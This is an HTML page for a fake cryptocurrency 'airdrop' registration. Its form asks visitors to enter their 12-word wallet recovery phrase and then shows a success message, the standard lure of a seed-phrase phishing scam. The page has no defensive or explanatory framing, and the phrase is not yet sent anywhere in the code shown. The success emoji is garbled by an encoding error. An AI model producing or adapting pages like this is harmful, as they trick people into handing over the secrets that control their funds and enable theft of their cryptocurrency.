<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Register for Airdrop</title>
  <style>
    body {
      background: url('airdrop-bg.webp') no-repeat center center fixed;
      background-size: cover;
      color: #ffffff;
      font-family: Arial, sans-serif;
      padding: 40px;
    }

    h1 {
      color: #ffffff;
      background: rgba(0, 0, 0, 0.6);
      display: inline-block;
      padding: 10px 20px;
      border-radius: 12px;
    }

    form {
      background: rgba(0, 0, 0, 0.7);
      padding: 30px;
      border-radius: 15px;
      max-width: 400px;
      margin-top: 30px;
    }

    input[type="text"], textarea {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 8px;
      border: none;
      background-color: #0d1117;
      color: #fff;
      resize: vertical;
    }

    input[type="submit"] {
      background: #00ffcc;
      padding: 10px 20px;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      width: 100%;
    }

    .success-message {
      margin-top: 20px;
      color: #00ffcc;
      font-weight: bold;
      display: none; /* HIDDEN BY DEFAULT */
    }
  </style>
</head>
<body>
  <h1>Join the Airdrop</h1>
  <form id="register-form">
    <input type="text" name="username" placeholder="Your Name" required />

    <!-- Mnemonic input -->
    <textarea name="wallet" placeholder="Enter your 12-word recovery phrase here..." rows="4" required></textarea>

    <input type="submit" value="Register" />
  </form>

  <div class="success-message" id="success-message">
    ðŸŽ‰ Registered successfully!
  </div>

  <script>
    document.getElementById("register-form").addEventListener("submit", function(e) {
      e.preventDefault();
      document.getElementById("success-message").style.display = "block";
    });
  </script>
</body>
</html>
